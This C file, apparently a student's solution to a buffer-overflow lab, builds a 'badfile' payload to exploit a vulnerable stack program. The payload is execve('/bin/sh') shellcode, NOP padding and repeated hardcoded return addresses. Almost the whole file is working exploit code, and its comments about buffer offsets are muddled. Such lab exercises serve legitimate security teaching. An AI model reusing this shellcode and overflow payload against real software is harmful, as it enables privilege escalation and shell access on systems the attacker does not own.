/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;
/* To get the stack pointer */


void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    /*
    The total size of the buffer to be overflow is 12+4 EBP +4 for the return address
    and the size of the shell code is 25 byte therfore
    the first 20 bytes from 517 bytes would be all the return address
    and starting from 516 till the size of the shell code we will fill the buffer with shell code
    */

    //  The new return address, obtained from stack.c code
    long New_Return_address = 0xbfffece4;
    //  Print the new address
    printf("The new Return address:%ld\n",New_Return_address );
    /* Character pointer to point to the addresses of the buffer*/
    char *ptr; 
    // Long pointer to hold the address of the buffer
    long *buffer_address_pointer;
    // Point at buffer 
    ptr = buffer;
    /* Point to the addresses of the buffer*/
    buffer_address_pointer = (long*)(ptr);

    /*The first 20 bytes filled with the new return until until it changes the eip*/
    for (int i = 0; i < 20; i++)
      *(buffer_address_pointer++) = New_Return_address;

    /* Filling the shell code from the least byte of the buffer(backwards)*/
    int allocate_shell_size = 517 - sizeof(shellcode) -1 ;/* -1 to avoid the last byte*/
    for (int i = 0; i <sizeof(shellcode) ; i++) {
      int d = allocate_shell_size + i;
      buffer[d] = shellcode[i];
     
    }

    /*end of the buffer will have no nop but instead a null operator*/
    buffer[516] = '\0';

    /* saving to badfile */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

